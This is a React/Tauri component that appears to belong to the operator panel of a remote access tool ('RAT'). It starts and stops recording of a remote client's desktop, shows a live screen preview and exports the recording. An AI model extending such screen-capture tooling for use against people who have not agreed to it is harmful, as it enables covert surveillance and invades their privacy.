import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  startDesktopRecordingCmd,
  stopDesktopRecordingCmd,
} from "../rat/RATCommands";
import {
  IconDeviceDesktop,
  IconPlayerPlay,
  IconPlayerPause,
  IconDownload,
  IconCircleCheck,
} from "@tabler/icons-react";

type FilePayload = {
  addr: string;
  name: string;
  data: string;
};

type DesktopPreviewPayload = {
  addr: string;
  data: string;
};

const base64ToUint8Array = (base64: string) => {
  const binary = window.atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

export const DesktopRecording: React.FC = () => {
  const { addr } = useParams();
  const [recordingActive, setRecordingActive] = useState(false);
  const [fileName, setFileName] = useState<string | null>(null);
  const [fileData, setFileData] = useState<string | null>(null);
  const [previewData, setPreviewData] = useState<string | null>(null);
  const [status, setStatus] = useState("Ready");

  useEffect(() => {
    const unlistenFile = listen("desktop_recording_file", (event: any) => {
      const payload = event.payload as FilePayload;
      if (!addr || payload.addr !== addr) return;
      setFileName(payload.name);
      setFileData(payload.data);
      setStatus("Desktop recording ready");
    });

    const unlistenPreview = listen("desktop_recording_preview", (event: any) => {
      const payload = event.payload as DesktopPreviewPayload;
      if (!addr || payload.addr !== addr) return;
      setPreviewData(`data:image/jpeg;base64,${payload.data}`);
    });

    return () => {
      unlistenFile.then((fn) => fn());
      unlistenPreview.then((fn) => fn());
    };
  }, [addr]);

  const startRecording = async () => {
    if (!addr) return;
    await startDesktopRecordingCmd(addr, 0, 70, 4);
    setRecordingActive(true);
    setStatus("Recording desktop...");
  };

  const stopRecording = async () => {
    if (!addr) return;
    await stopDesktopRecordingCmd(addr);
    setRecordingActive(false);
    setStatus("Stopping recording...");
  };

  const exportFile = async () => {
    if (!fileName || !fileData) return;
    const bytes = base64ToUint8Array(fileData);
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement("a");
    anchor.href = url;
    anchor.download = fileName;
    document.body.appendChild(anchor);
    anchor.click();
    anchor.remove();
    URL.revokeObjectURL(url);
    setStatus(`Saved file ${fileName}`);
  };

  return (
    <div className="p-6 w-full h-screen bg-primarybg flex flex-col gap-6 text-white">
      <div className="flex items-center gap-3">
        <IconDeviceDesktop size={28} />
        <div>
          <h1 className="text-2xl font-semibold">Desktop Recording</h1>
          <p className="text-sm text-gray-400">Record the client desktop to a file and export it later.</p>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <button
          className="py-3 px-5 rounded-xl bg-blue-600 hover:bg-blue-500 transition"
          onClick={startRecording}
          disabled={recordingActive}
        >
          <IconPlayerPlay size={18} className="inline-block mr-2" /> Start Recording
        </button>
        <button
          className="py-3 px-5 rounded-xl bg-red-600 hover:bg-red-500 transition"
          onClick={stopRecording}
          disabled={!recordingActive}
        >
          <IconPlayerPause size={18} className="inline-block mr-2" /> Stop Recording
        </button>
      </div>

      <div className="rounded-xl border border-accentx p-4 bg-secondarybg">
        <div className="flex items-center gap-2 text-gray-300">
          <IconCircleCheck size={18} />
          <span>Status</span>
        </div>
        <p className="mt-2 text-white">{status}</p>
      </div>

      {previewData && (
        <div className="rounded-xl border border-accentx p-4 bg-secondarybg">
          <div className="flex items-center gap-2 text-gray-300 mb-2">
            <span>Live preview</span>
          </div>
          <div className="w-full overflow-hidden rounded-xl bg-black">
            <img
              src={previewData}
              alt="Desktop preview"
              className="w-full h-auto"
            />
          </div>
        </div>
      )}

      {fileName && fileData && (
        <div className="rounded-xl border border-accentx p-4 bg-secondarybg flex flex-col gap-3">
          <div className="flex items-center justify-between">
            <span className="text-white font-medium">Recorded File</span>
            <button
              className="text-sm text-blue-300 hover:text-white"
              onClick={exportFile}
            >
              <IconDownload size={18} className="inline-block mr-2" /> Export file
            </button>
          </div>
          <p className="text-gray-300">{fileName}</p>
        </div>
      )}
    </div>
  );
};
